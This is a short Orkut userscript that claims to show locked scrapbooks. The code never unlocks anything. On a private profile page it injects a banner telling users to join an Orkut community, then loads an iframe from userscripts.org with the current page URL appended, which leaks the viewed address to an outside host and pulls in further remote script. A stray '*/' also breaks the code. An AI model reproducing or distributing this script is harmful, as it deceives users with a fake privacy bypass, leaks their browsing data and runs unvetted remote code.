// ==UserScript==
// @author        SahiL Khan
// @name           View Locked Scrapbook
// @description    View Locked Scrapbook
// @include        http://www.orkut.com/*
// ==/UserScript==

*/
if((document.getElementsByTagName('div').item(10).innerHTML.indexOf('This content has been set to private by the profile owner.')>=0))

{
document.body.innerHTML+="<br><h1>Join <a href='http:\/\/www.orkut.com\/CommunityJoin.aspx?cmm=29505217'>OrkuT HelP Center!</a></h1><br>"+"<iframe width='800' height='600'></iframe>"
window[0].location='http://userscripts.org/scripts/source/19650.user.js='+encodeURIComponent(location.href);
}




